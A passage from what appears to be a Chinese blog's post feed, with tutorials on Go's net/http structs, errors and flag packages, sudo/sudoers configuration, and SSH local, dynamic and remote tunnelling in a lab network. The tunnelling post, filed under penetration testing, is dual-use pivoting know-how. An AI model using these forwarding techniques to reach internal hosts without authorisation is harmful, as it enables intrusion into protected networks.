<span class="token comment" spellcheck="true">//对于Client端，设置该字段会覆盖掉URL.Host的值。</span>    <span class="token comment" spellcheck="true">//对于Server端，该字段是Host头部的值。</span>    Host <span class="token builtin">string</span>    <span class="token comment" spellcheck="true">//对于Client端，该字段无用。</span>    <span class="token comment" spellcheck="true">//对于Server端，Form用于存储解析form表单提交的数据（PATCH, POST, or PUT），另外还包括URL中的参数（URL.RawQuery）。需要先调用ParseForm函数进行解析，Form才有值。</span>    Form url<span class="token punctuation">.</span>Values    <span class="token comment" spellcheck="true">//对于Client端，该字段无用。</span>    <span class="token comment" spellcheck="true">//对于Server端，PostForm contains the parsed form data from PATCH, POST or PUT body parameters.也需要先调用ParseForm函数进行解析，才有值。</span>    PostForm url<span class="token punctuation">.</span>Values    <span class="token comment" spellcheck="true">// 对于Client端，该字段无用。</span>    <span class="token comment" spellcheck="true">// 对于Server端，该字段存储解析multipart form后的值，例如文件上传的。需要先调用ParseMultipartForm函数进行解析，才有值。</span>    MultipartForm <span class="token operator">*</span>multipart<span class="token punctuation">.</span>Form    <span class="token comment" spellcheck="true">// Few HTTP clients, servers, or proxies support HTTP trailers.</span>    Trailer Header    <span class="token comment" spellcheck="true">// This field is ignored by the HTTP client.</span>    RemoteAddr <span class="token builtin">string</span>    <span class="token comment" spellcheck="true">// 对于Client端，不能设置该字段。It is an error to set this field in an HTTP client request.</span>    <span class="token comment" spellcheck="true">// 对于Server端，存储URI。</span>    RequestURI <span class="token builtin">string</span>    <span class="token comment" spellcheck="true">// This field is ignored by the HTTP client.</span>    TLS <span class="token operator">*</span>tls<span class="token punctuation">.</span>ConnectionState    <span class="token comment" spellcheck="true">//已废弃</span>    Cancel <span class="token operator">&lt;-</span><span class="token keyword">chan</span> <span class="token keyword">struct</span><span class="token punctuation">{</span><span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// This field is only populated during client redirects.</span>    Response <span class="token operator">*</span>Response    <span class="token comment" spellcheck="true">// ctx is either the client or server context. It should only</span>    <span class="token comment" spellcheck="true">// be modified via copying the whole Request using WithContext.</span>    <span class="token comment" spellcheck="true">// It is unexported to prevent people from using Context wrong</span>    <span class="token comment" spellcheck="true">// and mutating the contexts held by callers of the same request.</span>    ctx context<span class="token punctuation">.</span>Context<span class="token punctuation">}</span></code></pre></li></ul><h2 id="六、http-Response"><a href="#六、http-Response" class="headerlink" title="六、http.Response"></a>六、http.Response</h2><p><code>Response</code>结构体用来表示一个<code>HTTP Response</code>消息。</p><pre class=" language-go"><code class="language-go"><span class="token comment" spellcheck="true">// Response represents the response from an HTTP request.</span><span class="token comment" spellcheck="true">//</span><span class="token comment" spellcheck="true">// The Client and Transport return Responses from servers once</span><span class="token comment" spellcheck="true">// the response headers have been received. The response body</span><span class="token comment" spellcheck="true">// is streamed on demand as the Body field is read.</span><span class="token keyword">type</span> Response <span class="token keyword">struct</span> <span class="token punctuation">{</span>    Status     <span class="token builtin">string</span> <span class="token comment" spellcheck="true">// e.g. "200 OK"</span>    StatusCode <span class="token builtin">int</span>    <span class="token comment" spellcheck="true">// e.g. 200</span>    Proto      <span class="token builtin">string</span> <span class="token comment" spellcheck="true">// e.g. "HTTP/1.0"</span>    ProtoMajor <span class="token builtin">int</span>    <span class="token comment" spellcheck="true">// e.g. 1</span>    ProtoMinor <span class="token builtin">int</span>    <span class="token comment" spellcheck="true">// e.g. 0</span>    <span class="token comment" spellcheck="true">// HTTP response消息头部，若多个头部的键相同，会被合并，值使用逗号分隔。</span>    Header Header    <span class="token comment" spellcheck="true">// Body represents the response body.</span>    <span class="token comment" spellcheck="true">// The response body is streamed on demand as the Body field</span>    <span class="token comment" spellcheck="true">// is read. If the network connection fails or the server</span>    <span class="token comment" spellcheck="true">// terminates the response, Body.Read calls return an error.</span>    Body io<span class="token punctuation">.</span>ReadCloser    ContentLength <span class="token builtin">int64</span>    TransferEncoding <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">string</span>    Close <span class="token builtin">bool</span>    <span class="token comment" spellcheck="true">//是否解压缩</span>    Uncompressed <span class="token builtin">bool</span>    Trailer Header    <span class="token comment" spellcheck="true">// This is only populated for Client requests.</span>    Request <span class="token operator">*</span>Request    TLS <span class="token operator">*</span>tls<span class="token punctuation">.</span>ConnectionState<span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
      </categories>
      
      
        <tags>
            
            <tag> net\http </tag>
            
            <tag> http Client </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux权限提升—sudo</title>
      <link href="2020/10/30/Linux%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E2%80%94sudo/"/>
      <url>2020/10/30/Linux%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E2%80%94sudo/</url>
      
        <content type="html"><![CDATA[<h2 id="sudo"><a href="#sudo" class="headerlink" title="sudo"></a><strong>sudo</strong></h2><p><code>sudo</code>即<code>Super User Do</code>，表示以超级用户（<code>root</code>）权限去执行一个任务，实际上通过配置该命令可以让当前用户以<code>root</code>或其它任意用户的权限去执行某个任务（<code>task</code>）。</p><p><code>sudo</code>命令的配置文件路径为<code>/etc/sudoers</code>，该配置文件只能由<code>root</code>用户使用<code>visudo</code>命令编辑修改。</p><h5 id="配置文件（sudoers）格式"><a href="#配置文件（sudoers）格式" class="headerlink" title="配置文件（sudoers）格式"></a><strong>配置文件（<code>sudoers</code>）格式</strong></h5><pre class=" language-shell"><code class="language-shell"># User privilege specificationroot    ALL=(ALL:ALL) ALL# Allow members of group sudo to execute any command%sudo   ALL=(ALL:ALL) ALL</code></pre><ul><li>第一个部分表示对<code>谁(who)</code>进行权限指定。可以对某个用户，也可以对某个用户组（对组时在组名前加<code>%</code>）。</li><li>第二部分表示限定用户从<code>哪个(Where)</code>主机连接登录时才能使用权限，<code>ALL</code>表示任意主机。</li><li>第三部分表示用户可以使用<code>谁的权限(Run as)</code>，括号中两部分分别代表<code>（user:group）</code>,<code>ALL</code>表示可以以任意用户的权限，<code>（ALL:ALL）</code>可以简写为<code>（ALL）</code>。</li><li>第四部分限定要执行的任务（<code>What</code>）。可以是某个命令、脚本等，有多个使用逗号(<code>,</code>)隔开。。</li></ul><p><strong>例子：</strong></p><blockquote><p><code>aqua  ALL=(ALL) NOPASSWD:/bin/cp</code></p><ul><li>表示用户<code>aqua</code>可以使用任意用户的权限执行<code>cp</code>命令，<code>NOPASSWD</code>表示不用输入密码(密码是当前用户的密码，而不是被使用权限的用户的密码)。</li></ul></blockquote><p><strong><code>sudo</code>基本用法</strong></p><ul><li><code>sudo -u username</code><ul><li><code>-u</code>用于指定要使用哪个用户的权限，不指定时默认是使用<code>root</code>用户权限。</li></ul></li><li><code>sudo -l</code><ul><li>列出当前用户的权限情况。</li></ul></li></ul><p><strong>su、sudo区别</strong></p><ul><li><code>sudo</code>是暂时以其它用户执行某个任务。<code>su</code>是切换到某个用户。</li><li><code>sudo</code>要求输入密码时，输入的是当前用户的密码。<code>su</code>要求输入的密码是要切换到的用户的密码。</li><li><code>sudo</code>不使用<code>-u</code>参数指定用户时，默认使用<code>root</code>用户权限。<code>su</code>不指定要切换的用户时，默认切换到<code>root</code>用户，<code>su</code>命令格式为<code>su 用户名</code>。</li><li><code>sudo su</code>是以<code>root</code>用户权限去执行<code>su</code>命令。</li></ul>]]></content>
      
      
      <categories>
          
          <category> Penetration Testing </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Privilege Escalation </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSH隧道总结</title>
      <link href="2020/10/29/SSH%E9%9A%A7%E9%81%93%E6%80%BB%E7%BB%93/"/>
      <url>2020/10/29/SSH%E9%9A%A7%E9%81%93%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h5 id="SSH隧道可以分为三种："><a href="#SSH隧道可以分为三种：" class="headerlink" title="SSH隧道可以分为三种："></a><strong>SSH隧道可以分为三种：</strong></h5><ul><li>本地转发（Local SSH tunneling）</li><li>动态转发（Dynamic SSH tunneling）</li><li>远程转发（Remote SSH tunneling）</li></ul><h5 id="本地转发"><a href="#本地转发" class="headerlink" title="本地转发"></a><strong>本地转发</strong></h5><img src="/2020/10/29/SSH%E9%9A%A7%E9%81%93%E6%80%BB%E7%BB%93/image-20201029211522167.png" alt="image-20201029211522167" style="zoom: 67%;"><p>环境描述</p><blockquote><p><code>Win10（192.168.31.251）</code> 无法直接访问 <code>CentOS(192.168.248.133)</code>。</p><p><code>Win10（192.168.31.251）</code> 可以直接访问 <code>Kali(192.168.31.138)</code>。</p><p><code>Kali(192.168.248.130)</code>    可以直接访问 <code>CentOS(192.168.248.133)</code>。</p></blockquote><p>现在<code>Win10</code>想要SSH到<code>CentOS</code>，可以通过本地转发隧道实现。</p><p>在<code>Win10</code>主机中打开<code>Powershell</code>输入：</p><ul><li><code>ssh  -L 9999:192.168.248.133:22  kali@192.168.31.138</code></li></ul><p>执行上面的命令后，<code>Win10</code>主机会与<code>Kali</code>主机建立一条隧道，并且<code>Win10</code>主机会监听<code>127.0.0.1:9999</code>，发往该监听地址的数据都会先通过隧道发到<code>Kali</code>主机，然后<code>Kali</code>主机会再发往<code>CentOS</code>主机。</p><img src="/2020/10/29/SSH%E9%9A%A7%E9%81%93%E6%80%BB%E7%BB%93/image-20201029214403140.png" alt="image-20201029214403140" style="zoom:67%;"><p>本地转发使用<code>-L</code>参数</p><ul><li><p><code>-L [bind_address:]port:host:hostport</code></p></li><li><p><code>-L [bind_address:]port:remote_socket</code></p></li><li><p><code>-L local_socket:host:hostport</code></p></li><li><p><code>-L local_socket:remote_socket</code></p><pre><code>             Specifies that connections to the given TCP port or Unix             socket on the local (client) host are to be forwarded to the             given host and port, or Unix socket, on the remote side.             This works by allocating a socket to listen to either a TCP             port on the local side, optionally bound to the specified             bind_address, or to a Unix socket.  Whenever a connection is             made to the local port or socket, the connection is for‐             warded over the secure channel, and a connection is made to             either host port hostport, or the Unix socket remote_socket,             from the remote machine.             Port forwardings can also be specified in the configuration             file.  Only the superuser can forward privileged ports.             IPv6 addresses can be specified by enclosing the address in             square brackets.             By default, the local port is bound in accordance with the             GatewayPorts setting.  However, an explicit bind_address may             be used to bind the connection to a specific address.  The             bind_address of “localhost” indicates that the listening             port be bound for local use only, while an empty address or             ‘*’ indicates that the port should be available from all in‐             terfaces.</code></pre></li></ul><h4 id="动态转发"><a href="#动态转发" class="headerlink" title="动态转发"></a><strong>动态转发</strong></h4><p>动态转发与本地转发的唯一区别在于，动态转发可以转发所有地址的所有TCP的流量，而本地转发只能转发某个地址的某个TCP端口的流量。</p><p>动态转发跟平时用的代理比较接近的，想要使用隧道就配置应用的代理即可。</p><p>依旧使用本地转发小节中的环境。在<code>Win10</code>中想要访问<code>CentOS</code>的HTTP服务，同时也想SSH到<code>CentOS</code>主机。</p><p>在<code>Win10</code>主机中打开<code>Powershell</code>输入：</p><ul><li><code>ssh -D 9999 kali@192.168.31.138</code></li></ul><p>执行上面的命令后，<code>Win10</code>主机会与<code>Kali</code>主机建立一条隧道，并且<code>Win10</code>主机会监听<code>127.0.0.1:9999</code>，发往该监听地址的数据都会先通过隧道发到<code>Kali</code>主机，然后<code>Kali</code>主机会再发往任意主机。</p><img src="/2020/10/29/SSH%E9%9A%A7%E9%81%93%E6%80%BB%E7%BB%93/image-20201029221043125.png" alt="image-20201029221043125" style="zoom:67%;"><p>接下来设置浏览器的代理服务器为<code>127.0.0.1:9999</code>，代理类型为<code>socks</code>。</p><img src="/2020/10/29/SSH%E9%9A%A7%E9%81%93%E6%80%BB%E7%BB%93/image-20201029221226695.png" alt="image-20201029221226695" style="zoom:50%;"><p>然后直接<code>CentOS</code>主机的Web服务，成功访问。</p><img src="/2020/10/29/SSH%E9%9A%A7%E9%81%93%E6%80%BB%E7%BB%93/image-20201029222718712.png" alt="image-20201029222718712" style="zoom:50%;"><p>此时，不止可以访问<code>CentOS</code>的任意服务，只要是<code>Kali</code>主机能访问的所有地址的所有服务都可以通过设置代理让<code>Win10</code>访问到。</p><p>动态转发使用<code>-D</code>参数</p><ul><li><p><code>-D [bind_address:]port</code></p><pre><code>             Specifies a local “dynamic” application-level port forward‐             ing.  This works by allocating a socket to listen to port on             the local side, optionally bound to the specified             bind_address.  Whenever a connection is made to this port,             the connection is forwarded over the secure channel, and the             application protocol is then used to determine where to con‐             nect to from the remote machine.  Currently the SOCKS4 and             SOCKS5 protocols are supported, and ssh will act as a SOCKS             server.  Only root can forward privileged ports.  Dynamic             port forwardings can also be specified in the configuration             file.             IPv6 addresses can be specified by enclosing the address in             square brackets.  Only the superuser can forward privileged             ports.  By default, the local port is bound in accordance             with the GatewayPorts setting.  However, an explicit             bind_address may be used to bind the connection to a spe‐             cific address.  The bind_address of “localhost” indicates             that the listening port be bound for local use only, while             an empty address or ‘*’ indicates that the port should be             available from all interfaces.</code></pre></li></ul><h4 id="远程转发"><a href="#远程转发" class="headerlink" title="远程转发"></a><strong>远程转发</strong></h4><img src="/2020/10/29/SSH%E9%9A%A7%E9%81%93%E6%80%BB%E7%BB%93/image-20201029225408658.png" alt="image-20201029225408658" style="zoom:67%;"><p>环境描述</p><blockquote><p><code>Ubuntu（192.168.31.8）</code> 无法直接访问 <code>CentOS(192.168.248.133)</code>。</p><p><code>Ubuntu（192.168.31.8）</code> 无法直接访问 <code>Kali(192.168.31.138)</code>。</p><p><code>Kali(192.168.248.130)</code>    可以直接访问 <code>CentOS(192.168.248.133)</code>。</p><p><code>Kali(192.168.248.130)</code>    可以直接访问 <code>Ubuntu（192.168.31.8）</code>。</p></blockquote><p><code>Ubuntu</code>想要访问<code>CentOS</code>,由于<code>Ubuntu</code>无法主动访问<code>Kali</code>，因此只能采用远程转发。</p><p>在<code>Kali</code>主机中执行：</p><ul><li><code>ssh -R 9999:192.168.248.133:22 a4ua@192.168.31.8</code></li></ul><img src="/2020/10/29/SSH%E9%9A%A7%E9%81%93%E6%80%BB%E7%BB%93/image-20201029230143234.png" alt="image-20201029230143234" style="zoom: 67%;"><p>执行上面的命令后，<code>Kali</code>主机会与<code>Ubuntu</code>主机建立一条隧道，并且<code>Ubuntu</code>主机会监听<code>127.0.0.1:9999</code>(注意，远程转发与本地转发的区别就在于这里，<code>-R</code>参数是远程的主机会开启监听。)，发往该监听地址的数据都会先通过隧道发到<code>Kali</code>主机，然后<code>Kali</code>主机会再发往任意主机。</p><p>在<code>ubuntu</code>中ssh连接到<code>127.0.0.1:9999</code>就会被<code>Kali</code>主机转发到<code>CentOS</code>。</p><img src="/2020/10/29/SSH%E9%9A%A7%E9%81%93%E6%80%BB%E7%BB%93/image-20201029230710347.png" alt="image-20201029230710347" style="zoom:67%;"><p>远程转发使用<code>-D</code>参数</p><ul><li><p><code> -R [bind_address:]port:host:hostport</code></p></li><li><p><code>-R [bind_address:]port:local_socket</code></p></li><li><p><code> -R remote_socket:host:hostport</code></p></li><li><p><code>-R remote_socket:local_socket</code></p></li><li><p><code>-R [bind_address:]port</code></p><pre><code>         Specifies that connections to the given TCP port or Unix         socket on the remote (server) host are to be forwarded to         the local side.         This works by allocating a socket to listen to either a TCP         port or to a Unix socket on the remote side.  Whenever a         connection is made to this port or Unix socket, the connec‐         tion is forwarded over the secure channel, and a connection         is made from the local machine to either an explicit desti‐         nation specified by host port hostport, or local_socket, or,         if no explicit destination was specified, ssh will act as a         SOCKS 4/5 proxy and forward connections to the destinations         requested by the remote SOCKS client.         Port forwardings can also be specified in the configuration         file.  Privileged ports can be forwarded only when logging         in as root on the remote machine.  IPv6 addresses can be         specified by enclosing the address in square brackets.         By default, TCP listening sockets on the server will be         bound to the loopback interface only.  This may be overrid‐         den by specifying a bind_address.  An empty bind_address, or         the address ‘*’, indicates that the remote socket should         listen on all interfaces.  Specifying a remote bind_address         will only succeed if the server&#39;s GatewayPorts option is en‐         abled (see sshd_config(5)).         If the port argument is ‘0’, the listen port will be dynami‐         cally allocated on the server and reported to the client at         run time.  When used together with -O forward the allocated         port will be printed to the standard output.</code></pre></li></ul><p><strong>远程动态转发</strong></p><p>当使用<code>-R</code>参数时，仅指定远程主机监听的端口，而不指定目标主机的IP和端口时，就是远程动态转发。</p><ul><li><code>ssh -R 9999 a4ua@192.168.31.8</code></li></ul><h4 id="通用参数"><a href="#通用参数" class="headerlink" title="通用参数"></a><strong>通用参数</strong></h4><ul><li><code>-f </code>:  后台运行进程。(避免关闭Terminal后连接就中断了)</li><li><code>-N</code> : 不返回SSH登录后的<code>Shell</code>。</li><li><code>-C</code> : 进行压缩，节约带宽。</li><li><code>-g</code> : 默认监听<code>127.0.0.1</code>，使用该参数后监听<code>0.0.0.0</code>。        </li></ul><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a><strong>总结</strong></h4><ul><li>本地转发和远程转发都可以有动态转发的形式。</li><li>本地转发类似普通的代理。动态转发可用于科学上网。远程转发用于内网穿透。</li></ul>]]></content>
      
      
      <categories>
          
          <category> Penetration Testing </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSH Tunnel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Golang学习之路—errors</title>
      <link href="2020/10/29/Golang%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E2%80%94errors/"/>
      <url>2020/10/29/Golang%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E2%80%94errors/</url>
      
        <content type="html"><![CDATA[<h2 id="error"><a href="#error" class="headerlink" title="error"></a>error</h2><p>在Go编程中，我们经常需要在程序没有正常执行时返回错误（<code>error</code>），<code>error</code>实际上是一个接口：</p><pre class=" language-go"><code class="language-go"><span class="token keyword">type</span> <span class="token builtin">error</span> <span class="token keyword">interface</span> <span class="token punctuation">{</span>    <span class="token function">Error</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token builtin">string</span><span class="token punctuation">}</span></code></pre><ul><li><code>error</code>接口要求实现<code>Error()</code>方法，该方法返回字符串类型的错误信息。</li></ul><h2 id="errors"><a href="#errors" class="headerlink" title="errors"></a>errors</h2><p><code>errors</code>是Go语言中内置的一个包，它简单实现了<code>error</code>接口，通过调用<code>errors</code>包提供的<code>New()</code>函数，我们可以快速的获得一个<code>error</code>类型的结构体来帮助我们返回简单的错误信息。</p><p><code>errors</code>包代码如下：</p><pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">New</span><span class="token punctuation">(</span>text <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token builtin">error</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token operator">&amp;</span>errorString<span class="token punctuation">{</span>text<span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// errorString is a trivial implementation of error.</span><span class="token keyword">type</span> errorString <span class="token keyword">struct</span> <span class="token punctuation">{</span>    s <span class="token builtin">string</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token punctuation">(</span>e <span class="token operator">*</span>errorString<span class="token punctuation">)</span> <span class="token function">Error</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token builtin">string</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> e<span class="token punctuation">.</span>s<span class="token punctuation">}</span></code></pre><p>使用<code>errors</code>包返回<code>error</code>的例子：</p><pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">checkName</span><span class="token punctuation">(</span>name <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">,</span> <span class="token builtin">error</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> name <span class="token operator">==</span> <span class="token string">"Aqua"</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token boolean">nil</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">,</span> errors<span class="token punctuation">.</span><span class="token function">New</span><span class="token punctuation">(</span><span class="token string">"check fail！"</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token boolean">_</span><span class="token punctuation">,</span> err <span class="token operator">:=</span> <span class="token function">checkName</span><span class="token punctuation">(</span><span class="token string">"Mikasa"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>         <span class="token comment" spellcheck="true">//check fail！</span>        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>err<span class="token punctuation">.</span><span class="token function">Error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//check fail！</span>        fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"%T\n"</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//*errors.errorString</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><ul><li><code>fmt.Println(err)</code> 等价于<code>fmt.Println(err.Error())</code></li></ul>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Go语言基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Go Package—flag</title>
      <link href="2020/10/29/Go-Package%E2%80%94flag/"/>
      <url>2020/10/29/Go-Package%E2%80%94flag/</url>
      
        <content type="html"><![CDATA[<p><code>flag</code>包是Go内置的用于解析程序命令行参数的包，本质上是对<code>os.Args</code>的封装。</p><h2 id="os-Args"><a href="#os-Args" class="headerlink" title="os.Args"></a>os.Args</h2><p><code>os.Args</code>是一个切片，里面存储着命令行参数，第一个元素是程序名，后面的元素是命令行参数。</p><pre class=" language-go"><code class="language-go"><span class="token comment" spellcheck="true">// test.go</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>Args<span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><ul><li>运行程序：<code>test.exe --name aqua -a=17</code><ul><li>打印结果：<code>[test.exe --name aqua -a=17]</code></li></ul></li></ul><h2 id="flag基础用法"><a href="#flag基础用法" class="headerlink" title="flag基础用法"></a>flag基础用法</h2><p>使用<code>flag</code>包解析命令行参数通常包括两个步骤，第一个步骤是定义用于接收命令行参数的<code>flag</code>，第二步是调用<code>flag.Parse()</code>函数进行解析，该函数会将命令行参数（<code>os.Args</code>）解析到在第一步中定义的<code>flag</code>中。</p><p>简单例子：</p><pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//第一步：定义接收命令行参数的flag</span>    mode <span class="token operator">:=</span> flag<span class="token punctuation">.</span><span class="token function">String</span><span class="token punctuation">(</span><span class="token string">"mode"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">"scan mode"</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">//定义字符串类型的参数</span>    th <span class="token operator">:=</span> flag<span class="token punctuation">.</span><span class="token function">Int</span><span class="token punctuation">(</span><span class="token string">"thread"</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">"num of thread"</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">//定义Int类型的参数</span>    <span class="token comment" spellcheck="true">//第二步：解析命令行参数到上一步定义的flag中。</span>    flag<span class="token punctuation">.</span><span class="token function">Parse</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">//go run test.go --mode fast --thread 14</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token operator">*</span>mode<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//fast</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token operator">*</span>th<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">//14</span><span class="token punctuation">}</span></code></pre><h4 id="Step-1：Define-flags"><a href="#Step-1：Define-flags" class="headerlink" title="Step 1：Define flags"></a>Step 1：Define flags</h4><p><code>flag</code>包支持的命令行参数类型有<code>bool</code>、<code>int</code>、<code>int64</code>、<code>uint</code>、<code>uint64</code>、<code>float</code> <code>float64</code>、<code>string</code>、<code>duration</code>。</p><p>如何理解命令行参数类型呢？</p><p>实际上从<code>os.Args</code>获取到的参数都是字符串(<code>string</code>)，而<code>flag</code>包提供的对应类型接收参数的函数，会帮我们做<code>string</code>到Go内置类型的转换。</p><pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    age <span class="token operator">:=</span> flag<span class="token punctuation">.</span><span class="token function">Int</span><span class="token punctuation">(</span><span class="token string">"age"</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">"help message"</span><span class="token punctuation">)</span>    checked <span class="token operator">:=</span> flag<span class="token punctuation">.</span><span class="token function">Bool</span><span class="token punctuation">(</span><span class="token string">"check"</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token string">"help message"</span><span class="token punctuation">)</span>    flag<span class="token punctuation">.</span><span class="token function">Parse</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">//go run test.go --age 18 --check true</span>    fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"%T\n"</span><span class="token punctuation">,</span> <span class="token operator">*</span>age<span class="token punctuation">)</span>     <span class="token comment" spellcheck="true">//int</span>    fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"%T\n"</span><span class="token punctuation">,</span> <span class="token operator">*</span>checked<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//bool</span>    fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"%T\n"</span><span class="token punctuation">,</span> os<span class="token punctuation">.</span>Args<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//[]string</span><span class="token punctuation">}</span></code></pre><p><strong>在定义接收命令参数的<code>flag</code>时，每种类型的命令行参数接收都有两种定义方法。</strong></p><ul><li><p><code>flag.Type()</code>和<code>flag.TypeVar()</code></p><ul><li><p><code>Type</code>是具体的类型(<code>int</code>、<code>string</code>…)。</p><pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    age1 <span class="token operator">:=</span> flag<span class="token punctuation">.</span><span class="token function">Int</span><span class="token punctuation">(</span><span class="token string">"age1"</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">"help message"</span><span class="token punctuation">)</span>    <span class="token keyword">var</span> age2 <span class="token builtin">int</span>    flag<span class="token punctuation">.</span><span class="token function">IntVar</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>age2<span class="token punctuation">,</span> <span class="token string">"age2"</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">"help message"</span><span class="token punctuation">)</span>    flag<span class="token punctuation">.</span><span class="token function">Parse</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">//go run test.go --age1 18 --age2 19</span>    fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"%T、%v\n"</span><span class="token punctuation">,</span> age1<span class="token punctuation">,</span> <span class="token operator">*</span>age1<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//*int、18</span>    fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"%T、%v\n"</span><span class="token punctuation">,</span> age2<span class="token punctuation">,</span> age2<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//int、19</span><span class="token punctuation">}</span></code></pre><ul><li><p><code>flag.Int()</code>具有返回值，返回指针。<code>flag.IntVar()</code>无返回值，但需要传入接收参数的变量的指针，使用时直接是值。</p></li><li><p>同理的还有：<code>flag.String()</code>与<code>flag.StringVar()</code>、<code>flag.Bool()</code>与<code>flag.BoolVar()</code>等等其它类型。</p><pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">BoolVar</span><span class="token punctuation">(</span>p <span class="token operator">*</span><span class="token builtin">bool</span><span class="token punctuation">,</span> name <span class="token builtin">string</span><span class="token punctuation">,</span> value <span class="token builtin">bool</span><span class="token punctuation">,</span> usage <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token keyword">func</span> <span class="token function">Bool</span><span class="token punctuation">(</span>name <span class="token builtin">string</span><span class="token punctuation">,</span> value <span class="token builtin">bool</span><span class="token punctuation">,</span> usage <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token operator">*</span><span class="token builtin">bool</span><span class="token keyword">func</span> <span class="token function">IntVar</span><span class="token punctuation">(</span>p <span class="token operator">*</span><span class="token builtin">int</span><span class="token punctuation">,</span> name <span class="token builtin">string</span><span class="token punctuation">,</span> value <span class="token builtin">int</span><span class="token punctuation">,</span> 